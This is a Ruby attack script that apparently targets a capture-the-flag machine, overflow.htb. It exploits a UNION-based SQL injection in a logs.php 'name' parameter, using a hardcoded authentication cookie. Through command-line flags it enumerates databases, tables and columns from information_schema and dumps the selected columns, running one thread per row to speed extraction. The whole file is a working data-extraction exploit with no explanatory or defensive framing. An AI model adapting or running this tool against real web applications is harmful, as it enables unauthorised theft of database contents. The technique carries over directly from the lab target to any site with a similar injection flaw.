#!/usr/bin/env ruby

require 'optparse'
require 'uri'

require 'net/http'

options = {}

OptionParser.new do |opt|
  opt.on('--get-dbs') { |_o| options[:get_dbs] = true }
  opt.on('--db DATABASE_NAME') { |o| options[:db_name] = o }
  opt.on('--get-tables') { |_o| options[:get_tables] = true }
  opt.on('--table TABLE_NAME') { |o| options[:table_name] = o }
  opt.on('--get-columns') { |_o| options[:get_columns] = true }
  opt.on('--columns COLUMN_1[,COLUMN_2,...]') { |o| options[:columns] = o }
end.parse!

def do_sqli(query)
  payload = "') union select 1,1,(#{query}) union select 1,1,('1"
  url = URI("http://overflow.htb/home/logs.php?name=#{payload}")

  cookie = 'auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'
  res = Net::HTTP.get(url, { Cookie: cookie })

  return '' if res.empty?

  res.split("<div id='last'>Last login : ").last.delete_suffix('</div><br>')
end

def do_sqli_threads(query, number)
  res = Array.new(number)
  threads = Array.new(number)

  (0...number).each do |i|
    threads[i] = Thread.new { res[i] = do_sqli("#{query} limit #{i},1") }
  end

  threads.each(&:join)
  res
end

if options[:get_dbs]
  n = do_sqli('select count(*) from information_schema.schemata').to_i
  puts "[*] Number of databases: #{n}.\n\n"

  query = 'select schema_name from information_schema.schemata'

  puts do_sqli_threads(query, n)
  exit
end

if !options[:db_name].empty? && options[:get_tables]
  db_name = options[:db_name]

  n = do_sqli("select count(*) from information_schema.tables where table_schema = '#{db_name}'").to_i
  puts "[*] Number of tables in #{db_name}: #{n}.\n\n"

  query = "select table_name from information_schema.tables where table_schema = '#{db_name}'"

  puts do_sqli_threads(query, n)
  exit
end

if !options[:db_name].empty? && !options[:table_name].empty? && options[:get_columns]
  db_name = options[:db_name]
  table_name = options[:table_name]

  n = do_sqli("select count(*) from information_schema.columns where table_schema = '#{db_name}' and table_name = '#{table_name}'").to_i
  puts "[*] Number of columns in #{db_name}.#{table_name}: #{n}.\n\n"

  query = "select column_name from information_schema.columns where table_schema = '#{db_name}' and table_name = '#{table_name}'"

  puts do_sqli_threads(query, n)
  exit
end

def write_header(columns)
  puts "| #{columns.map { |_, g| g[:label].ljust(g[:width]) }.join(' | ')} |"
end

def write_divider(columns)
  puts "+-#{columns.map { |_, g| '-' * g[:width] }.join('-+-')}-+"
end

def write_line(value, columns)
  puts "| #{value.keys.map { |k| value[k].ljust(columns[k][:width]) }.join(' | ')} |"
end

def write_table(values, columns)
  write_divider(columns)
  write_header(columns)
  write_divider(columns)
  values.each { |v| write_line(v, columns) }
  write_divider(columns)
end

unless options[:db_name].empty? || options[:table_name].empty? || options[:columns].empty?
  db_name = options[:db_name]
  table_name = options[:table_name]
  column_names = options[:columns].split(',')
  columns = column_names.join(",' *** ',")

  n = do_sqli("select count(*) from #{db_name}.#{table_name}").to_i
  puts "[*] Number of rows in #{db_name}.#{table_name}: #{n}.\n\n"

  query = "select concat(#{columns}) from #{db_name}.#{table_name}"

  res = do_sqli_threads(query, n)

  res.each_with_index do |result, i|
    res_obj = {}
    result.split(' *** ').each_with_index { |r, j| res_obj[column_names[j]] = r }
    res[i] = res_obj
  end

  col_labels = {}
  column_names.each { |c| col_labels[c] = c }

  columns = col_labels.each_with_object({}) do |(col, label), h|
    h[col] = { label:, width: [res.map { |g| g[col].size }.max, label.size].max }
  end

  write_table(res, columns)
end
